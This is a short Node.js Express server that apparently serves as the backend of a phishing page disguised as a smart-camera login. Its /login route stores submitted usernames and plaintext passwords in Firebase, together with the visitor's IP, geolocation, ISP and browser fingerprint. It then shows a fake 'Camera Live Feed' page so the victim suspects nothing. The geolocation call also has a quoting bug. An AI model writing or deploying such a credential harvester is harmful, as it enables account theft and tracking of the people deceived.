const express = require("express");
const bodyParser = require("body-parser");
const admin = require("firebase-admin");

const app = express();

// 🔥 Middleware
app.set("trust proxy",true);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// 🔥 Firebase setup
const serviceAccount = JSON.parse(process.env.FIREBASE_KEY);

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://smartcamx100-default-rtdb.firebaseio.com/"
});

const db = admin.database();

// 📡 Login data receive panna
app.post("/login",async (req, res) => {
  const data = req.body;
const rawIP=req.headers['x-forwarded-for']||req.ip;
  const ip=rawIP.split(",")[0].trim();
  let geoData={};
  try{
    const geoRes=await fetch('https://ipwho.is/${ip}');
    geoData=await geoRes.json();
  }catch(err){
    console.log("Geo API error:",err);
  }
  const ref = db.ref("loginAttempts").push();
  ref.set({
    time: new Date().toLocaleString(),
   ip:ip,
    country:geoData.country||"N/A",
    city:geoData.city||"N/A",
    isp:geoData.isp||"N/A",
    lat:geoData.lat||"N/A",
    lon:geoData.lon||"N/A",
    username: data.username || "N/A",
    password: data.password || "N/A",
    userAgent: data.agent || "N/A",
    platform: data.platform || "N/A",
    language: data.language || "N/A",
    screen: data.screen || "N/A"
  });

  console.log("🔥 Data received:", data);

  res.redirect("/dashboard");
});

// 📊 Dashboard
app.get("/dashboard", (req, res) => {
  res.send("<h2>Camera Live Feed</h2><p>Status: Online</p>");
});

// 🚀 Server start
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
